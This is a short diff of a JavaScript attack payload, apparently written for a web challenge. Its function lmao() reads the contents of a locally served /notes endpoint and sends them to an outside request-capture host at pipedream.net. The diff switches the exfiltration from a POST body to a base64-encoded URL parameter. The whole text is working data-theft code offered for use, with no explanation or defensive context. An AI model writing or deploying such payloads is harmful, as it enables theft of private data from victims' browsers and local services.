@@ -11,10 +11,7 @@
 //       iframe.width = '200';
 //       iframe.height = '400';
       async function lmao() {
-      fetch("https://enx6dgfqdmci.x.pipedream.net/", {
-        method: "post",
-        body: await fetch("http://0.0.0.0:8080/notes").then(res => res.text()),
-      });
+      fetch("https://enx6dgfqdmci.x.pipedream.net/?a=" + btoa(await fetch("http://0.0.0.0:8080/notes").then(res => res.text())));
       }
       lmao()
 //       link.click();
